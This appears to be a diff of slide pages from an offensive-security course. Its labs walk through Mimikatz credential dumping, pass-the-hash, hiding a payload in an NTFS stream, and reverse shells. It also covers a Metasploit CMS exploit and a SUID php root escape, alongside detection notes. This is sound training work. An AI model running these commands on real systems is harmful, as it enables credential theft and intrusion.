+          <text x="470" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">sekurlsa::logonpasswords &mdash; read LSASS memory</text>
+          <path d="M236,174 L704,174" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="470" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">plaintext passwords + NT hashes + Kerberos tickets</text>
+          <path d="M704,228 L236,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="260" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--purple)"/>
+          <text x="470" y="280" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--purple)">reuse a credential &rarr; the next host (pass-the-hash / login)</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>As SYSTEM you can grant yourself debug rights, which let you read another process&#39;s memory &mdash; here, LSASS.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Mimikatz walks LSASS&#39;s memory structures where the OS caches credentials of interactive/logged-on sessions.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Out come every logged-on user&#39;s secrets &mdash; frequently a domain admin who once RDP&#39;d in. This is the crown jewel.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>A dumped hash feeds straight back into Session 5&#39;s pass-the-hash, or a plaintext logs you in. One box became the whole network.</div>
+        </figure><h2 class="mono" style="color:var(--orange)"><span class="h-t">Mimikatz &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td>A post-exploitation tool that extracts secrets from Windows memory and the security subsystem &mdash; plaintext passwords, hashes, Kerberos tickets, and more.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>Because Windows caches credentials in LSASS for single sign-on. Mimikatz reads that cache &mdash; turning local SYSTEM into network-wide credentials.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td>Get SYSTEM (or SeDebug), run <span class="mono">privilege::debug</span>, then a <span class="mono">sekurlsa::</span> or <span class="mono">lsadump::</span> module. Take the loot back to pass-the-hash / a fresh login.</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code>mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords      # plaintext + NT hashes of logged-on users
+lsadump::sam                  # local SAM hashes
+sekurlsa::tickets /export     # Kerberos tickets (pass-the-ticket)
+kerberos::list</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td>Per session: <span class="mono">Username</span>, <span class="mono">NTLM</span> hash, and often a cleartext <span class="mono">Password</span>. A domain-admin line here is game over for the domain.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>Credentials &rarr; lateral movement (pass-the-hash from S5) &rarr; the next host &rarr; the engagement report&#39;s impact section.</td></tr>
+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">Loud to modern EDR.</span> Opening a handle to <span class="mono">lsass.exe</span> is <b>Sysmon Event ID 10</b> &mdash; a top-tier detection. Defender/EDR flags Mimikatz on sight; real operators use LSASS-dump alternatives and evasion (S7). You will write this rule in Lab 8.</td></tr>
+</tbody></table>
+</div><div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; check you can reach LSASS (as SYSTEM)</span><pre><code>tasklist /fi "imagename eq lsass.exe"
+# then in mimikatz:  privilege::debug   =>  'Privilege 20 OK'</code></pre><p style="margin-top:8px"><b>You should see:</b> <span class="mono">Privilege 20 OK</span> means SeDebug is enabled and LSASS is readable &mdash; <span class="mono">sekurlsa::logonpasswords</span> will dump it (Lab 4).</p></div><div class="box key-takeaway"><span class="box-t">The line that ends the offensive half</span><p><strong class="hl hl-w">SYSTEM on one box is credentials for the network.</strong> This is why privilege escalation matters beyond the single host &mdash; and why LSASS access is one of the most-monitored actions in any SOC.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Break">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P14</span><span class="tag recall">Pause</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Break &mdash; 10 Minutes</h1>
+      <p class="lede">You can take a low-priv shell to root and SYSTEM. Next: dump the loot, hide data, and run the whole chain unaided.</p>
+    </div>
+    <div class="content">
+      <div style="display:flex;justify-content:center;padding:20px 0">
+        <div data-timer="10"><svg viewBox="0 0 120 120" width="120" height="120"><circle cx="60" cy="60" r="52" fill="none" stroke="#333b4c" stroke-width="8"/><circle cx="60" cy="60" r="52" fill="none" stroke="#ff7043" stroke-width="8" stroke-linecap="round"/></svg></div>
+      </div>
+      <div class="box soc"><span class="box-t">When we come back</span><p>Mimikatz on LSASS, steganography (hiding and finding data), then the two capstone machines where you run recon &rarr; exploit &rarr; privesc end to end &mdash; and finally the detection rule and the engagement report.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 4: Mimikatz">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P15</span><span class="tag lab">Hands-on · everyone · generates evidence</span><span class="time">&#9201; 12 min</span></div>
+      <h1>Lab 4 &mdash; Dump the Credentials from Memory</h1>
+      <p class="lede">As SYSTEM, pull the plaintext passwords, hashes and tickets out of LSASS &mdash; and generate the Sysmon 10 evidence you will detect in Lab 8.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>With the SYSTEM shell from Lab 3, run Mimikatz against LSASS and harvest every logged-on credential. Then take one of them and prove it works on another host &mdash; the &quot;one box becomes the network&quot; moment. This also creates the LSASS-access evidence for the detection lab.</p></div><div class="box lab-box"><span class="box-t">Target &amp; authorisation</span><p>WIN10-TGT01 as SYSTEM (or the DC via a domain admin). Lab-only credentials. If Defender quarantines Mimikatz, that is the SOC flip working &mdash; use the instructor&#39;s excluded copy for the demo.</p></div><ol class="steps">
+<li>
+<strong>Dump LSASS.</strong>
+<pre><code>mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">mimikatz #</span><span class="sim-tool">sekurlsa::logonpasswords</span></div>
+  <div class="sim-body">
+<span class="l cmd">privilege::debug</span>
+<span class="l ok">Privilege '20' OK</span>
+<span class="l cmd">sekurlsa::logonpasswords</span>
+<span class="l dim">Authentication Id : 0 ; 995213</span>
+<span class="l dim">User Name         : m.said</span>
+<span class="l info">* Username : m.said</span>
+<span class="l info">* NTLM     : e19ccf75ee54e06b06a5907af13cef42</span>
+<span class="l hl">* Password : Autumn2025!</span>
+<span class="l crit">(a domain credential, straight from memory)</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>Cleartext + hash from memory</b> &mdash; no cracking needed.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Per logged-on session: username, NTLM hash, and often a cleartext password</li></ul></div>
+</li>
+<li>
+<strong>Dump the local SAM and tickets too.</strong>
+<pre><code>lsadump::sam
+sekurlsa::tickets /export</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Local SAM hashes and exported Kerberos tickets saved</li></ul></div>
+</li>
+<li>
+<strong>Reuse a credential on another host</strong> (the payoff).
+<pre><code>nxc smb 192.168.56.20 -u m.said -H e19ccf75ee54e06b06a5907af13cef42
+# or the plaintext with evil-winrm / psexec  ->  a shell on the NEXT box</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A dumped credential authenticates to a second host &mdash; lateral movement proven</li><li>Sysmon 10 (LSASS access) evidence saved for Lab 8</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>Network credentials from one host&#39;s memory, and proof they open the next door. And the single most detectable action of the day &mdash; opening a handle to LSASS &mdash; which is exactly the rule you write in Lab 8.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Steganography">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P16</span><span class="tag theory">Method · hiding in plain sight</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Steganography &mdash; Data Hidden Inside Data</h1>
+      <p class="lede">Not encryption &mdash; concealment. A password inside an image, a file inside a file. You will meet it in the capstone, so learn to hide and to find.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why a hacker cares about stego</span><p>Encryption hides the <em>content</em> but screams &quot;something secret is here.&quot; <strong>Steganography hides the existence</strong> &mdash; a credential tucked inside an ordinary-looking JPG, a file smuggled in an NTFS stream. Attackers use it to exfiltrate and to stage payloads; CTFs (including today&#39;s capstone) hide credentials this way. You need both sides: hide, and detect.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 150" role="img" aria-label="Two steganography techniques: image steganography hides data in an image with steghide or stegseek, and NTFS alternate data streams hide a file inside another file. Click each.">
+          <g class="node" data-node="img" tabindex="0"><rect x="30" y="40" width="410" height="80" rx="10" fill="#1a1f2a" stroke="#a78bfa"/><text class="d-title" x="235" y="66" text-anchor="middle" font-size="13" fill="#a78bfa">Image steganography</text><text class="d-sub" x="235" y="86" text-anchor="middle">a secret embedded in the pixels of a JPG/PNG</text><text class="d-sub" x="235" y="104" text-anchor="middle" class="d-mono">steghide · stegseek · binwalk</text></g>
+          <g class="node" data-node="ads" tabindex="0"><rect x="500" y="40" width="410" height="80" rx="10" fill="#1a1f2a" stroke="#22d3ee"/><text class="d-title" x="705" y="66" text-anchor="middle" font-size="13">NTFS Alternate Data Streams</text><text class="d-sub" x="705" y="86" text-anchor="middle">a whole file hidden inside another file</text><text class="d-sub" x="705" y="104" text-anchor="middle" class="d-mono">file.jpg:hidden.txt · dir /r</text></g>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; how it hides, and how you find it.</div>
+        <div class="dgm-detail" data-detail="img"><h5><span class="dd-tag">IMAGE</span>A secret in the pixels</h5><p><b>Tools embed data in an image&#39;s pixel/colour data, often passphrase-protected.</b> Hide: <span class="mono">steghide embed -cf cat.jpg -ef secret.txt</span>. Find: <span class="mono">steghide extract -sf cat.jpg</span> (needs the passphrase), or <span class="mono">stegseek cat.jpg rockyou.txt</span> to <em>crack</em> the passphrase, or <span class="mono">binwalk -e</span> for appended files. The capstone hides a credential exactly this way.</p></div>
+        <div class="dgm-detail" data-detail="ads"><h5><span class="dd-tag">NTFS ADS</span>A file inside a file</h5><p><b>NTFS lets a file carry hidden &quot;streams.&quot;</b> Hide: <span class="mono">type secret.txt &gt; image.jpg:hidden.txt</span>. The image looks and opens normally; the stream is invisible to a normal <span class="mono">dir</span>. Find: <span class="mono">dir /r</span> shows streams; <span class="mono">more &lt; image.jpg:hidden.txt</span> reads it. A classic Windows hiding spot.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; hide and reveal with NTFS ADS (Windows)</span><pre><code>echo secret-password > cover.txt:stash.txt   # hide a stream
+dir /r                                        # cover.txt:stash.txt shows up
+more < cover.txt:stash.txt                    # read it back</code></pre><p style="margin-top:8px"><b>You should see:</b> <span class="mono">dir /r</span> reveals the hidden <span class="mono">:stash.txt</span> stream that a normal <span class="mono">dir</span> never shows &mdash; concealment, defeated by knowing to look.</p></div><div class="box defender-view"><span class="box-t">Detection</span><p><strong>Compare file sizes</strong> against a known-good copy, run <span class="mono">stegseek</span>/<span class="mono">steghide</span>/<span class="mono">binwalk</span> on suspicious media, and <span class="mono">dir /r</span> for ADS. The tell is usually <em>an image that is bigger than it should be</em>, or an executable launched from an alternate data stream.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 5: steganography">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P17</span><span class="tag lab">Hands-on · everyone</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Lab 5 &mdash; Hide It, Crack It, Find It</h1>
+      <p class="lede">Embed a secret in an image, crack a protected one with stegseek, and hide a file in an NTFS stream &mdash; the exact skills the capstone needs.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>Practise both directions so the capstone&#39;s stego step is muscle memory: embed and extract with steghide, crack an unknown passphrase with stegseek, and hide/find an NTFS ADS. Small lab, high payoff &mdash; DoubleTrouble hides its first credential in an image.</p></div><ol class="steps">
+<li>
+<strong>Embed and extract (steghide).</strong>
+<pre><code>steghide embed -cf cat.jpg -ef secret.txt      # set a passphrase
+steghide extract -sf cat.jpg                   # asks for the passphrase</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You embed <span class="mono">secret.txt</span> and extract it back with the passphrase</li></ul></div>
+</li>
+<li>
+<strong>Crack a protected image (stegseek).</strong> When you do not know the passphrase:
+<pre><code>stegseek cat.jpg /usr/share/wordlists/rockyou.txt
+# [i] Found passphrase: "sunshine"
+# [i] Extracting to cat.jpg.out ...</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">stegseek</span></div>
+  <div class="sim-body">
+<span class="l cmd">stegseek cat.jpg rockyou.txt</span>
+<span class="l dim">StegSeek 0.6</span>
+<span class="l ok">[i] Found passphrase: "sunshine"</span>
+<span class="l ok">[i] Original filename: "creds.txt".</span>
+<span class="l ok">[i] Extracting to "cat.jpg.out"</span>
+<span class="l cmd">cat cat.jpg.out</span>
+<span class="l hl">admin:S3cr3tUpload!</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>stegseek brute-forces the passphrase</b> against a wordlist &mdash; fast.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>stegseek recovers the passphrase and extracts the hidden file &mdash; this is the capstone technique</li></ul></div>
+</li>
+<li>
+<strong>NTFS ADS (Windows).</strong>
+<pre><code>type payload.exe > report.pdf:svc.exe
+dir /r                       # report.pdf:svc.exe appears
+# read/execute the stream to confirm</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You hid and then found a file inside an NTFS stream</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>The full stego skill set &mdash; hide, crack, and detect &mdash; ready for the capstone, where a cracked image yields the credential that gets you in.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The capstone">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P18</span><span class="tag activity">The whole chain, unaided</span><span class="time">&#9201; 6 min</span></div>
+      <h1>The Capstone &mdash; The Whole Chain, One Machine</h1>
+      <p class="lede">Two fresh machines, no walkthrough held open. Run everything the diploma taught &mdash; recon to root &mdash; and write it up.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why the capstone is the point of the whole half</span><p>Every session so far taught one phase. The capstone is where they become <strong>one continuous engagement</strong>: you get an IP and nothing else, and you take it to root while documenting every step. This is exactly a junior penetration test &mdash; and it is the deliverable that proves the diploma&#39;s offensive half.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 150" role="img" aria-label="The capstone methodology: recon, scan and enumerate, find the way in, get a shell, escalate privileges, and document. Click each phase.">
+          <g class="node" data-node="c1" tabindex="0"><rect x="8" y="50" width="140" height="56" rx="9" fill="#1f2533" stroke="#22d3ee"/><text class="d-title" x="78" y="74" text-anchor="middle" font-size="12">1 · Recon + Scan</text><text class="d-sub" x="78" y="92" text-anchor="middle">S2 · S3</text></g>
+          <g class="node" data-node="c2" tabindex="0"><rect x="160" y="50" width="150" height="56" rx="9" fill="#1f2533" stroke="#fbbf24"/><text class="d-title" x="235" y="74" text-anchor="middle" font-size="12">2 · Enumerate</text><text class="d-sub" x="235" y="92" text-anchor="middle">web · services · stego</text></g>
+          <g class="node" data-node="c3" tabindex="0"><rect x="322" y="50" width="140" height="56" rx="9" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="392" y="74" text-anchor="middle" font-size="12">3 · Way in</text><text class="d-sub" x="392" y="92" text-anchor="middle">S4 · exploit / creds</text></g>
+          <g class="node" data-node="c4" tabindex="0"><rect x="474" y="50" width="130" height="56" rx="9" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="539" y="74" text-anchor="middle" font-size="12">4 · Shell</text><text class="d-sub" x="539" y="92" text-anchor="middle">S5 · foothold</text></g>
+          <g class="node" data-node="c5" tabindex="0"><rect x="616" y="50" width="140" height="56" rx="9" fill="#1a1f2a" stroke="#e63946"/><text class="d-title" x="686" y="74" text-anchor="middle" font-size="12">5 · Escalate</text><text class="d-sub" x="686" y="92" text-anchor="middle">S6 · root/SYSTEM</text></g>
+          <g class="node" data-node="c6" tabindex="0"><rect x="768" y="50" width="164" height="56" rx="9" fill="#1f2533" stroke="#4ade80"/><text class="d-title" x="850" y="74" text-anchor="middle" font-size="12" fill="#4ade80">6 · Document</text><text class="d-sub" x="850" y="92" text-anchor="middle">the report</text></g>
+          <path d="M148,78 L158,78" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/><path d="M310,78 L320,78" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/><path d="M462,78 L472,78" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/><path d="M604,78 L614,78" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/><path d="M756,78 L766,78" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each phase &mdash; the session that taught it, and what it looks like on the capstone.</div>
+        <div class="dgm-detail" data-detail="c1"><h5><span class="dd-tag">1 · RECON + SCAN (S2/S3)</span>Map the target</h5><p><b><span class="mono">nmap -sC -sV -p-</span></b> for ports, versions and default-script findings. This is Sessions 2&ndash;3 &mdash; you already own it. Every capstone starts here.</p></div>
+        <div class="dgm-detail" data-detail="c2"><h5><span class="dd-tag">2 · ENUMERATE</span>Go deep on what you found</h5><p><b>Web: directory brute-force (<span class="mono">gobuster</span>), read page source, DNS/vhost enum. Media: stego.</b> Both capstones hide the way-in here &mdash; a <span class="mono">/secret</span> directory, an image with a credential, a hidden subdomain.</p></div>
+        <div class="dgm-detail" data-detail="c3"><h5><span class="dd-tag">3 · WAY IN (S4)</span>Vuln or credential</h5><p><b>A matched CVE (a vulnerable CMS), or a credential you recovered (from stego or a dump).</b> DoubleTrouble: creds from an image &rarr; an upload page. Blackpearl: a Navigate CMS exploit.</p></div>
+        <div class="dgm-detail" data-detail="c4"><h5><span class="dd-tag">4 · SHELL (S5)</span>Get code execution</h5><p><b>Upload a reverse shell, or fire the exploit, and catch it.</b> You land as a low-priv web user (<span class="mono">www-data</span>) &mdash; the foothold. Reverse shell, upgrade the TTY: pure Session 5.</p></div>
+        <div class="dgm-detail" data-detail="c5"><h5><span class="dd-tag">5 · ESCALATE (S6)</span>Become root</h5><p><b>Run the loop: linPEAS &rarr; a SUID/GTFOBins or sudo/cron misconfig &rarr; root.</b> Blackpearl: a SUID PHP binary via GTFOBins. DoubleTrouble: a SUID/kernel path. Today&#39;s Half A, on a live target.</p></div>
+        <div class="dgm-detail" data-detail="c6"><h5><span class="dd-tag">6 · DOCUMENT</span>Write the engagement report</h5><p><b>Every step, with proof and a remediation line.</b> This is Lab 9 &mdash; and it is what a client actually pays for. A root shell with no report is worth far less than a clear report.</p></div>
+      </figure>
+      <div class="box key-takeaway"><span class="box-t">How the capstone is run</span><p><strong class="hl">You get an IP; you get root; you write it up.</strong> Work in teams, rotate the keyboard, and keep notes <em>as you go</em> &mdash; the report is graded, not the speed. The next two labs are the two machines.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 6: DoubleTrouble">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P19</span><span class="tag lab">Hands-on · teams · capstone A</span><span class="time">&#9201; 25 min</span></div>
+      <h1>Lab 6 &mdash; Capstone A: DoubleTrouble</h1>
+      <p class="lede">Web to root on a fresh box: enumerate, crack a stego image for credentials, upload a shell, then escalate.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The chain (do not read past your current step)</span><p>DoubleTrouble runs the classic web-to-root chain, with a stego twist in the middle &mdash; exactly why you drilled stegseek in Lab 5. Work the phases; only reveal the next when you are stuck.</p></div><div class="box lab-box"><span class="box-t">Target &amp; authorisation</span><p>The <span class="mono">DoubleTrouble</span> VM you imported, host-only, snapshotted. Authorised because you deployed it. Do not point these steps at anything else.</p></div><ol class="steps">
+<li>
+<strong>1&ndash;2 · Recon &rarr; enumerate.</strong>
+<pre><code>nmap -sC -sV -p- <target>
+gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
+# find a /secret directory with an image</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Open web ports, and a hidden directory containing an image</li></ul></div>
+</li>
+<li>
+<strong>3 · Stego &rarr; credentials.</strong>
+<pre><code>wget http://<target>/secret/doubletrouble.jpg
+stegseek doubletrouble.jpg /usr/share/wordlists/rockyou.txt
+cat doubletrouble.jpg.out     # => credentials</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>stegseek cracks the image and yields a username:password</li></ul></div>
+</li>
+<li>
+<strong>4 · Log in &rarr; upload a reverse shell.</strong>
+<pre><code># log in to the app with the recovered creds
+# find the file-upload endpoint, upload a PHP reverse shell
+# start a listener and trigger it:
+nc -lvnp 443</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You catch a reverse shell as the web user (e.g. <span class="mono">www-data</span>)</li></ul></div>
+</li>
+<li>
+<strong>5 · Escalate &rarr; root.</strong>
+<pre><code>/tmp/linpeas.sh | tee out
+# find the privesc vector (SUID / sudo / kernel) and abuse it
+id    # uid=0(root)</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">www-data@doubletrouble: /tmp</span><span class="sim-tool">capstone A</span></div>
+  <div class="sim-body">
+<span class="l cmd">stegseek doubletrouble.jpg rockyou.txt</span>
+<span class="l ok">[i] Found passphrase; extracting -> creds</span>
+<span class="l cmd"># login -> upload shell -> catch</span>
+<span class="l ok">www-data@doubletrouble:/$ id</span>
+<span class="l dim">uid=33(www-data)</span>
+<span class="l cmd">./linpeas.sh | grep -i suid</span>
+<span class="l hl">SUID/kernel vector found -> exploit -> root</span>
+<span class="l cmd root">id</span>
+<span class="l ok">uid=0(root)</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>Recon &rarr; stego &rarr; upload &rarr; privesc</b> &mdash; the whole diploma in one box.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">id</span> = root; grab <span class="mono">/root/root.txt</span></li><li>Engagement report: full chain documented with proof at each phase</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>A complete, unaided compromise of a machine you had never seen &mdash; and the notes for its engagement report. This is the junior-pentest job.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 7: Blackpearl">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P20</span><span class="tag lab">Hands-on · teams · capstone B</span><span class="time">&#9201; 25 min</span></div>
+      <h1>Lab 7 &mdash; Capstone B: Blackpearl</h1>
+      <p class="lede">A different route to root: DNS enumeration, a vulnerable CMS via Metasploit, then a SUID binary through GTFOBins.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why a second, different machine</span><p>DoubleTrouble was web+stego+SUID. Blackpearl swaps in <strong>DNS/vhost enumeration</strong> and a <strong>CMS exploit</strong>, and escalates through a <strong>SUID PHP</strong> binary &mdash; so you prove the methodology transfers, not just one path. Same six phases, different findings.</p></div><div class="box lab-box"><span class="box-t">Target &amp; authorisation</span><p>The <span class="mono">Blackpearl</span> VM you imported, host-only, snapshotted. Authorised because you deployed it.</p></div><ol class="steps">
+<li>
+<strong>1&ndash;2 · Recon &rarr; DNS enumeration.</strong>
+<pre><code>nmap -sC -sV -p- <target>
+gobuster dir -u http://<target> -w common.txt   # find /secret
+# read the page source of /secret -> a domain name
+echo "<target> blackpearl.tld" | sudo tee -a /etc/hosts
+gobuster dir -u http://blackpearl.tld -w common.txt   # new vhost, new dirs</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A hidden domain revealed in page source; added to <span class="mono">/etc/hosts</span>; a new directory set appears (Navigate CMS)</li></ul></div>
+</li>
+<li>
+<strong>3&ndash;4 · CMS exploit &rarr; shell.</strong>
+<pre><code>searchsploit navigate cms
+msfconsole -q
+use exploit/multi/http/navigate_cms_rce   # or the matched module
+set RHOSTS blackpearl.tld ; exploit
+# => shell as www-data</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A Metasploit module for the CMS gives a shell as <span class="mono">www-data</span></li></ul></div>
+</li>
+<li>
+<strong>5 · Escalate &rarr; root via SUID PHP (GTFOBins).</strong>
+<pre><code>/tmp/linpeas.sh | grep -i suid
+# /usr/bin/php has the SUID bit -> gtfobins.github.io/gtfobins/php/#suid
+php -r "pcntl_exec('/bin/sh', ['-p']);"
+id    # euid=0(root)</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">www-data@blackpearl: /tmp</span><span class="sim-tool">capstone B</span></div>
+  <div class="sim-body">
+<span class="l cmd">gobuster dir -u http://blackpearl.tld -w common.txt</span>
+<span class="l ok">/navigate  (Navigate CMS)</span>
+<span class="l cmd">msf> use exploit/.../navigate_cms_rce ; exploit</span>
+<span class="l ok">[*] shell as www-data</span>
+<span class="l cmd">./linpeas.sh | grep -i suid</span>
+<span class="l hl">-rwsr-xr-x  /usr/bin/php   <-- SUID php</span>
+<span class="l cmd">php -r "pcntl_exec('/bin/sh',['-p']);"</span>
+<span class="l cmd root">id</span>
+<span class="l ok">uid=33(www-data) euid=0(root)</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>DNS &rarr; CMS &rarr; SUID PHP</b> &mdash; a different chain, the same skills.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>SUID PHP + the GTFOBins one-liner gives a root shell</li></ul></div>
+</li>
+<li>
+<strong>6 · Document.</strong>
+<pre><code>cat /root/root.txt
+# write up both machines in the engagement report (Lab 9)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Root on the second capstone; both chains recorded for the report</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>A second, different full chain &mdash; proof the methodology, not a memorised path, is what gets you root. Two machines, two routes, one skill set.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The privesc SOC flip">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P21</span><span class="tag defensive">Defender · the consolidated flip</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Every Escalation Today, and the Log It Left</h1>
+      <p class="lede">You escalated all afternoon. Here is the other side &mdash; the handful of events that betray a user becoming root or SYSTEM.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why elevation is so detectable</span><p>A user does not normally gain new privileges, install services, or read LSASS. Each of those is <strong>rare and high-signal</strong> &mdash; which is why privilege escalation, done without care, lights up a SOC. Learn the pairs and you can catch what you just did.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 300" role="img" aria-label="Interactive map: four escalation actions in orange on the left, each paired with the defender evidence in green on the right. Click each.">
+          <text x="235" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#ff7043">ATTACKER did</text>
+          <text x="705" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#4ade80">SOC sees</text>
+          <line x1="470" y1="40" x2="470" y2="286" stroke="#333b4c" stroke-width="1.2" stroke-dasharray="3 4"/>
+          <g class="node" data-node="tok" tabindex="0"><rect x="20" y="48" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="70" font-size="12">Token abuse / became SYSTEM (Lab 3)</text><text class="d-sub" x="38" y="90" class="d-mono">PrintSpoofer / potato</text></g>
+          <rect x="490" y="48" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="70" font-size="13" fill="#4ade80" class="d-mono">4672</text><text class="d-sub" x="560" y="70">special privileges assigned to new logon</text><text class="d-sub" x="508" y="90">a normal user suddenly holding SYSTEM rights</text><path d="M450,74 L488,74" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="svc" tabindex="0"><rect x="20" y="112" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="134" font-size="12">Service created / reconfigured (Lab 3)</text><text class="d-sub" x="38" y="154" class="d-mono">sc config / new service payload</text></g>
